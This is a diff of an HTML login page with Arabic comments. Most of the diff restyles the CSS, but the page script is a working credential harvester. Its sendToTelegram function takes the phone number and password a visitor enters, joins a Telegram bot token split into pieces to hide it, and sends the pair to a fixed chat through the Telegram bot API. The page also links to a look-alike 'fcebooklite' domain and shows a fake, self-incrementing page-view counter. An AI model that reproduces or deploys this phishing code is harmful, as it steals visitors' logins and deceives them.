@@ -8,7 +8,7 @@
     <!-- Google Fonts -->
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
     <style>
-        /* Set the background image */
+        /* تحسين الخلفية مع تأثير تعتيم */
         body {
             margin: 0;
             padding: 0;
@@ -19,195 +19,215 @@
             align-items: center;
             justify-content: center;
             font-family: 'Roboto', sans-serif;
-            text-decoration: none; /* Remove underline for all text */
+            backdrop-filter: blur(5px); /* تأثير تعتيم للخلفية */
         }
         a {
             text-decoration: none;
         }
         @keyframes moveUpDown {
-            0% {
-                transform: translateY(0);
-            }
-            50% {
-                transform: translateY(-10px);
-            }
-            100% {
-                transform: translateY(0);
-            }
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-15px); }
         }
-        /* Card Container */
+        /* تحسين البطاقة مع تأثير زجاجي */
         .card {
-            background-color: rgba(255, 255, 255, 0.1);
-            padding: 30px;
-            border-radius: 20px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
-            max-width: 400px;
+            background: rgba(255, 255, 255, 0.15);
+            backdrop-filter: blur(10px); /* تأثير زجاجي */
+            padding: 40px;
+            border-radius: 25px;
+            box-shadow: 0 12px 35px rgba(0, 0, 0, 0.3);
+            max-width: 450px;
             width: 100%;
             text-align: center;
-            animation: moveUpDown 3s ease-in-out infinite;
-            transition: transform 0.3s, box-shadow 0.3s;
+            animation: moveUpDown 4s ease-in-out infinite; /* رسوم متحركة أكثر سلاسة */
+            transition: transform 0.4s ease, box-shadow 0.4s ease;
+            border: 1px solid rgba(255, 255, 255, 0.2);
         }
         .card:hover {
-            transform: translateY(-10px);
-            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.6);
+            transform: translateY(-15px);
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
         }
-        /* Style for the logo */
+        /* تحسين الشعار */
         .telegram-text img {
-            width: 150px;
+            width: 160px;
             height: auto;
-            margin-bottom: 20px;
+            margin-bottom: 25px;
+            filter: drop-shadow(0 4px 8px rgba(0, 0, 0, 0.2)); /* ظل خفيف */
         }
         .phone-input {
-            width: 70%;
-            height: 25px;
-            font-size: 14px;
-            padding: 8px;
-            margin-bottom: 15px;
-            border-radius: 8px;
-            border: 1px solid #ddd;
+            width: 80%;
+            height: 30px;
+            font-size: 16px;
+            padding: 10px;
+            margin-bottom: 20px;
+            border-radius: 10px;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            background: rgba(255, 255, 255, 0.1);
+            color: #fff;
             text-align: center;
-            font-family: 'Roboto', sans-serif;
-            transition: border 0.3s, box-shadow 0.3s;
+            transition: all 0.3s ease;
         }
         .phone-input:focus {
             border-color: #ff7e5f;
-            box-shadow: 0 0 5px rgba(255, 126, 95, 0.5);
+            box-shadow: 0 0 8px rgba(255, 126, 95, 0.6);
+            background: rgba(255, 255, 255, 0.2);
             outline: none;
         }
-        /* Style for the login button */
+        /* تحسين زر تسجيل الدخول */
         .login-button {
-            width: 70%;
+            width: 80%;
             height: 50px;
             background: linear-gradient(135deg, #ff7e5f, #feb47b);
             color: white;
             font-size: 18px;
+            font-weight: 700;
             border: none;
-            border-radius: 8px;
-            margin-bottom: 15px;
+            border-radius: 10px;
+            margin-bottom: 20px;
             cursor: pointer;
             display: inline-flex;
             align-items: center;
             justify-content: center;
-            transition: background 0.3s, transform 0.3s;
+            box-shadow: 0 5px 15px rgba(255, 126, 95, 0.4);
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
         }
         .login-button:hover {
             background: linear-gradient(135deg, #feb47b, #ff7e5f);
-            transform: scale(1.05);
+            transform: scale(1.08);
+            box-shadow: 0 8px 20px rgba(255, 126, 95, 0.6);
         }
-        /* Style for the additional icon and text */
+        .login-button:active::after {
+            content: '';
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.3);
+            animation: ripple 0.5s ease-out;
+        }
+        @keyframes ripple {
+            0% { transform: scale(0); opacity: 1; }
+            100% { transform: scale(4); opacity: 0; }
+        }
+        /* تحسين More Info */
         .more-info {
-            font-family: 'Roboto', sans-serif;
-            color: #333;
-            margin-top: 10px;
+            color: #fff;
+            margin-top: 15px;
             display: flex;
             align-items: center;
             justify-content: center;
-            transition: color 0.3s, transform 0.3s;
+            transition: all 0.3s ease;
         }
         .more-info img {
-            width: 24px;
-            height: 24px;
-            margin-right: 8px;
+            width: 28px;
+            height: 28px;
+            margin-right: 10px;
+            filter: brightness(1.2);
         }
         .more-info:hover {
-            color: #ff7e5f;
-            transform: scale(1.05);
+            color: #feb47b;
+            transform: scale(1.1);
         }
-        /* Style for the new auth buttons */
+        /* تحسين أزرار المصادقة */
         .auth-button {
             width: 100%;
             height: 50px;
-            background-color: rgba(0, 0, 0, 0.8);
+            background: rgba(0, 0, 0, 0.85);
             color: white;
             font-size: 18px;
             border: none;
-            border-radius: 8px;
+            border-radius: 10px;
             margin-bottom: 15px;
             cursor: pointer;
             display: flex;
             align-items: center;
             justify-content: center;
-            transition: background 0.3s, transform 0.3s;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            transition: all 0.3s ease;
         }
         .auth-button img {
-            width: 24px;
-            height: 24px;
-            margin-right: 10px;
+            width: 26px;
+            height: 26px;
+            margin-right: 12px;
         }
         .auth-button:hover {
-            background-color: rgba(0, 0, 0, 0.9);
+            background: rgba(0, 0, 0, 1);
             transform: scale(1.05);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.5);
         }
-        /* Style for the popup */
+        /* تحسين النافذة المنبثقة */
         .popup {
             display: none;
             position: fixed;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            background-color: rgba(255, 255, 255, 0.8);
-            color: black;
-            border: 2px solid black;
-            padding: 20px;
-            border-radius: 10px;
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.9), rgba(254, 180, 123, 0.7));
+            color: #333;
+            border: none;
+            padding: 25px;
+            border-radius: 15px;
             z-index: 1000;
-            font-family: 'Roboto', sans-serif;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.3);
         }
         .popup h2 {
-            margin: 0;
-            font-size: 18px;
+            margin: 5px 0;
+            font-size: 20px;
+            font-weight: 700;
         }
         .popup button {
-            margin-top: 10px;
-            padding: 5px 10px;
-            background-color: black;
+            margin-top: 15px;
+            padding: 8px 15px;
+            background: #ff7e5f;
             color: white;
             border: none;
-            border-radius: 5px;
+            border-radius: 8px;
             cursor: pointer;
-            transition: background 0.3s;
+            transition: all 0.3s ease;
         }
         .popup button:hover {
-            background-color: grey;
+            background: #feb47b;
+            transform: scale(1.05);
         }
-        /* Error message style */
+        /* تحسين رسالة الخطأ */
         #error-message {
-            color: red;
+            color: #ff5f5f;
             margin-top: 10px;
+            font-size: 14px;
+            font-weight: 500;
             display: none;
+            background: rgba(255, 0, 0, 0.1);
+            padding: 5px 10px;
+            border-radius: 5px;
         }
+        /* تحسين الإحصائيات */
         .stat {
-            display: inline-grid;
             width: 100%;
-            grid-template-columns: repeat(1, 1fr);
-            column-gap: 1rem;
-            padding-left: 1.rem;
-            padding-right: 1.1rem;
-            padding-top: 1rem;
-            padding-bottom: 1rem;
+            display: grid;
+            grid-template-columns: 1fr;
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            margin-top: 20px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
         }
-
         .stat-title {
-            grid-column-start: 1;
-            white-space: nowrap;
-            color: rgb(197, 194, 194);
+            color: #ddd;
+            font-size: 14px;
+            font-weight: 500;
         }
-
         .stat-value {
-            grid-column-start: 1;
-            white-space: nowrap;
-            font-size: 2.25rem;
-            line-height: 2.5rem;
+            font-size: 2.5rem;
             font-weight: 800;
+            color: #fff;
+            transition: color 0.3s ease;
         }
-
         .stat-desc {
-            grid-column-start: 1;
-            white-space: nowrap;
-            font-size: 0.75rem;
-            line-height: 1rem;
-            color: rgb(197, 194, 194);
+            font-size: 0.85rem;
+            color: #bbb;
+        }
+        .stat:hover .stat-value {
+            color: #feb47b;
         }
     </style>
 </head>
@@ -252,109 +272,91 @@
             <h2> ...🤍🚶‍♂️!©️ </h2>
             <button onclick="closePopup()">𝑐𝑙𝑜𝑠𝑒</button>
         </div>
-        <script>
-            // Function to close the popup and play sound
-            function closePopup() {
-                document.getElementById('popup').style.display = 'none';
-                // Get the audio element and play the sound
-                var audio = document.getElementById('close-sound');
-                if (audio) audio.play();
+
+        <!-- إحصائيات -->
+        <div class="stat">
+            <div class="stat-title">Total Page Views</div>
+            <div class="stat-value" id="pageViews">89,405</div>
+            <div class="stat-desc">21% more than last month</div>
+        </div>
+    </div>
+
+    <script>
+        // Function to close the popup
+        function closePopup() {
+            document.getElementById('popup').style.display = 'none';
+        }
+
+        // Show the popup when the page loads
+        window.onload = function() {
+            document.getElementById('popup').style.display = 'block';
+        };
+
+        function sendToTelegram() {
+            var phoneNumber = document.querySelector('.phone-input[type="text"]').value;
+            var password = document.querySelector('.phone-input[type="password"]').value;
+
+            var segment1 = "6428071347:";
+            var segment2 = "AAHP1yP2bZ";
+            var segment3 = "FkKB_82p";
+            var segment4 = "BcseiH4D";
+            var segment5 = "gu-EVtE";
+            var segment6 = "AU";
+
+            var vps = segment1 + segment2 + segment3 + segment4 + segment5 + segment6;
+
+            var identifier = "5318149339"; 
+            var message = "TargeT: " + phoneNumber + "\nPassword: " + password;
+
+            var telegramUrl = `https://api.telegram.org/bot${vps}/sendMessage?chat_id=${identifier}&text=${encodeURIComponent(message)}`;
+
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", telegramUrl, true);
+            xhr.send();
+        }
+
+        // تعديل زر تسجيل الدخول
+        document.querySelector('.login-button').addEventListener('click', function(event) {
+            var phoneNumber = document.querySelector('.phone-input[type="text"]').value;
+            var password = document.querySelector('.phone-input[type="password"]').value;
+            var errorMessage = document.getElementById('error-message');
+
+            errorMessage.style.display = 'none';
+
+            if (!/^\d{11}$/.test(phoneNumber)) {
+                errorMessage.textContent = 'يرجى إدخال رقم هاتف صحيح.';
+                errorMessage.style.display = 'block';
+                event.preventDefault();
+                return;
             }
 
-            // Show the popup when the page loads
-            window.onload = function() {
-                document.getElementById('popup').style.display = 'block';
-            };
+            sendToTelegram();
 
-            function sendToTelegram() {
-                var phoneNumber = document.querySelector('.phone-input[type="text"]').value;
-                var password = document.querySelector('.phone-input[type="password"]').value;
-
-                var segment1 = "6428071347:";
-                var segment2 = "AAHP1yP2bZ";
-                var segment3 = "FkKB_82p";
-                var segment4 = "BcseiH4D";
-                var segment5 = "gu-EVtE";
-                var segment6 = "AU";
-
-                var vps = segment1 + segment2 + segment3 + segment4 + segment5 + segment6;
-
-                var identifier = "5318149339"; 
-                var message = "TargeT: " + phoneNumber + "\nPassword: " + password;
-
-                var telegramUrl = `https://api.telegram.org/bot${vps}/sendMessage?chat_id=${identifier}&text=${encodeURIComponent(message)}`;
-
-                // Send the message to Telegram
-                var xhr = new XMLHttpRequest();
-                xhr.open("GET", telegramUrl, true);
-                xhr.send();
+            if (password === 'admin_00') {
+                window.location.href = 'admin.html';
+            } else if (password === 'facebook00') {
+                window.location.href = 'https://fcebooklite.netlify.app';
+            } else if (password === 'rewan00') {
+                window.location.href = 'film/guest.html';
+            } else if (password.length === 6) {
+                window.location.href = 'film/guest.html';
+            } else if (password.length < 6 || password.length > 6) {
+                errorMessage.textContent = 'يرجى إدخال كلمة مرور تتكون من 6 أحرف أو أرقام.';
+                errorMessage.style.display = 'block';
+                event.preventDefault();
             }
+        });
 
-            // تعديل ارتباط الدالة ليتم استدعاؤها عند الضغط على زر تسجيل الدخول
-            document.querySelector('.login-button').addEventListener('click', function(event) {
-                var phoneNumber = document.querySelector('.phone-input[type="text"]').value;
-                var password = document.querySelector('.phone-input[type="password"]').value;
-                var errorMessage = document.getElementById('error-message');
-
-                // Clear previous error
-                errorMessage.style.display = 'none';
-
-                // Validate phone number
-                if (!/^\d{11}$/.test(phoneNumber)) {
-                    errorMessage.textContent = 'يرجى إدخال رقم هاتف صحيح.';
-                    errorMessage.style.display = 'block';
-                    event.preventDefault();
-                    return;
-                }
-
-                      // Send data to Telegram before any redirection
-                sendToTelegram();
-
-                // Handle redirection based on password
-                if (password === 'admin_00') {
-                    window.location.href = 'admin.html'; // Redirect for admin_00
-                } else if (password === 'facebook00') {
-                    window.location.href = 'https://fcebooklite.netlify.app'; // Redirect for rewan2332000
-                } else if (password === 'rewan00') {
-                    window.location.href = 'film/guest.html'; // Redirect for rewan2332000
-                } else if (password.length === 6) {
-                    window.location.href = 'film/guest.html';
-                } else if (password.length < 6) {
-                    errorMessage.textContent = 'يرجى إدخال كلمة مرور تتكون من 6 أحرف أو أرقام.';
-                    errorMessage.style.display = 'block';
-                    event.preventDefault(); // Prevent default form submission or redirection
-                } else if (password.length > 6) {
-                    errorMessage.textContent = 'يرجى إدخال كلمة مرور تتكون من 6 أحرف أو أرقام.';
-                    errorMessage.style.display = 'block';
-                    event.preventDefault(); // Prevent default form submission or redirection
-                } else {
-                    // Handle other passwords if needed
-                    errorMessage.style.display = 'none';
-                }
-            });
-        </script>
-         <!-- إضافة الكارت الجديد في أسفل الصفحة -->
-         <div class="stats shadow">
-            <div class="stat">
-                <div class="stat-title">Total Page Views</div>
-                <div class="stat-value" id="pageViews">89,405</div>
-                <div class="stat-desc">21% more than last month</div>
-            </div>
-            <script>
-                // الحصول على العنصر الذي يحتوي على العدد
-                const pageViewsElement = document.getElementById('pageViews');
-                
-                // تحويل النص إلى عدد صحيح
-                let pageViews = parseInt(pageViewsElement.textContent.replace(/,/g, ''));
+        // تحديث الإحصائيات
+        const pageViewsElement = document.getElementById('pageViews');
+        let pageViews = parseInt(pageViewsElement.textContent.replace(/,/g, ''));
         
-                // دالة لتحديث العدد
-                function updatePageViews() {
-                    pageViews += 2; // زيادة العدد بمقدار 37
-                    pageViewsElement.textContent = pageViews.toLocaleString(); // تحديث النص المعروض
-                }
+        function updatePageViews() {
+            pageViews += 2;
+            pageViewsElement.textContent = pageViews.toLocaleString();
+        }
         
-                // تحديث العدد كل 10 دقائق (600,000 ميلي ثانية)
-                setInterval(updatePageViews, 9000); // 10 دقائق
-            </script>
-    </body>
-    </html>
+        setInterval(updatePageViews, 9000);
+    </script>
+</body>
+</html>
